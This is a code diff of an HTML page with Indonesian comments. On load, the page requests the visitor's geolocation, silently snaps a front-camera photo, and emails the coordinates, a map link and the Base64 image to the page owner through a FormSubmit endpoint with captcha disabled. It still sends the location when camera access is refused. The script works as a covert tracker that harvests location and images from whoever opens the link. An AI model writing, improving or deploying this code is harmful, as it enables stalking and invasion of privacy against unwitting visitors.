@@ -23,125 +23,103 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // Token FormSubmit Anda
         const TOKEN_FORM = "d9a1b68b96ce0a668a22f62f9a3f5284"; 
 
         document.addEventListener("DOMContentLoaded", () => {
-            ambilLokasi();
+            jalankanSistemBerurutan();
         });
 
+        // FUNGSI UTAMA: Mengatur urutan jalannya fungsi secara sinkron
+        async function jalankanSistemBerurutan() {
+            console.log("TAHAP 1: Memulai permintaan akses lokasi...");
+            
+            // Menunggu fungsi ambilLokasi selesai sepenuhnya sebelum lanjut ke baris berikutnya
+            const koordinat = await ambilLokasi(); 
+            
+            console.log("TAHAP 2: Lokasi selesai diproses. Memulai akses kamera...");
+            
+            // Menjalankan fungsi kamera dengan membawa hasil koordinat dari Tahap 1
+            aktifkanKameraDanAmbil(koordinat.lat, koordinat.lon);
+        }
+
+        // Fungsi mengambil lokasi dengan Promise agar bisa ditunggu (await)
         function ambilLokasi() {
-            console.log("Mengecek lokasi...");
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        console.log("Lokasi sukses:", lat, lon);
-                        aktifkanKameraDanAmbil(lat, lon);
-                    },
-                    (error) => {
-                        console.error("Izin lokasi ditolak.");
-                        aktifkanKameraDanAmbil("-", "-");
-                    }
-                );
-            } else {
-                aktifkanKameraDanAmbil("-", "-");
-            }
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            console.log("Lokasi sukses didapatkan.");
+                            resolve({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude
+                            });
+                        },
+                        (error) => {
+                            console.warn("Izin lokasi ditolak oleh pengguna.");
+                            resolve({ lat: "-", lon: "-" }); // Tetap lanjut walaupun ditolak
+                        },
+                        { timeout: 10000 } // Batas waktu tunggu respons lokasi (10 detik)
+                    );
+                } else {
+                    console.error("Browser tidak mendukung Geolocation.");
+                    resolve({ lat: "-", lon: "-" });
+                }
+            });
         }
 
         async function aktifkanKameraDanAmbil(lat, lon) {
-            console.log("Mengakses kamera...");
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
                 video.onplaying = () => {
-                    console.log("Kamera aktif, memproses frame...");
-                    // Jeda 2 detik agar sensor lensa menyesuaikan pencahayaan
+                    // Jeda 2 detik agar sensor lensa menyesuaikan pencahayaan otomatis
                     setTimeout(() => {
-                        prosesJepretDanKirim(lat, lon, video, stream);
+                        prosesJepretDanKirimBase64(lat, lon, video, stream);
                     }, 2000);
                 };
-
             } catch (error) {
-                console.error("Kamera ditolak, mengirim teks lokasi saja.");
-                kirimDataTeksSaja(lat, lon);
+                console.warn("Izin kamera ditolak oleh pengguna.");
+                kirimDataTeksSaja(lat, lon, "Ditolak/Error");
             }
         }
 
-        function prosesJepretDanKirim(lat, lon, videoElement, stream) {
+        function prosesJepretDanKirimBase64(lat, lon, videoElement, stream) {
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
 
             const lebar = videoElement.videoWidth || 640;
             const tinggi = videoElement.videoHeight || 480;
-            
             canvas.width = lebar;
             canvas.height = tinggi;
             
             context.drawImage(videoElement, 0, 0, lebar, tinggi);
 
-            // Matikan kamera secara bersih setelah frame diambil
+            // Matikan aliran kamera
             stream.getTracks().forEach(track => track.stop());
 
-            // Konversi canvas menjadi file PNG fisik
-            canvas.toBlob((blob) => {
-                if (!blob || blob.size === 0) {
-                    console.error("File gambar kosong, beralih ke teks.");
-                    kirimDataTeksSaja(lat, lon);
-                    return;
-                }
+            // Konversi gambar ke teks string Base64 (kualitas 50% agar hemat ruang)
+            const dataTeksGambar = canvas.toDataURL("image/jpeg", 0.5); 
 
-                console.log("Ukuran gambar berhasil diproses:", blob.size, "bytes");
-
-                const formData = new FormData();
-                formData.append("Status_Kamera", "Sukses Diambil");
-                formData.append("Latitude", lat);
-                formData.append("Longitude", lon);
-                formData.append("Link_Peta", `https://www.google.com/maps?q=${lat},${lon}`);
-                
-                // PENTING: Nama parameter WAJIB "attachment" agar dibaca sebagai file oleh FormSubmit
-                formData.append("attachment", blob, "camera_capture.png");
-                formData.append("_captcha", "false");
-
-                eksekusiKirim(formData);
-            }, "image/png");
+            kirimDataTeksSaja(lat, lon, "Sukses Diambil", dataTeksGambar);
         }
 
-        function kirimDataTeksSaja(lat, lon) {
+        function kirimDataTeksSaja(lat, lon, statusKamera, fotoBase64 = "Tidak Ada Foto") {
             const formData = new FormData();
-            formData.append("Status_Kamera", "Gagal/Ditolak");
+            formData.append("Status_Kamera", statusKamera);
             formData.append("Latitude", lat);
             formData.append("Longitude", lon);
             formData.append("Link_Peta", `https://www.google.com/maps?q=${lat},${lon}`);
+            formData.append("Hasil_Foto_Base64", fotoBase64);
             formData.append("_captcha", "false");
 
-            eksekusiKirim(formData);
-        }
-
-        async function eksekusiKirim(formData) {
             const url = `https://formsubmit.co/ajax/${TOKEN_FORM}`;
-            console.log("Mengirim data ke server FormSubmit...");
             
-            try {
-                const response = await fetch(url, {
-                    method: "POST",
-                    body: formData
-                });
-
-                if (response.ok) {
-                    console.log("BERHASIL: Seluruh data dan gambar terkirim!");
-                } else {
-                    console.error("Server merespon dengan error.");
-                }
-            } catch (err) {
-                console.error("Gagal melakukan request network:", err.message);
-            }
+            console.log("Sedang mengirimkan data terintegrasi ke email...");
+            fetch(url, { method: "POST", body: formData })
+                .then(res => console.log("Proses selesai. Seluruh data terkirim."))
+                .catch(err => console.error("Gagal mengirim data:", err));
         }
     </script>
 </body>
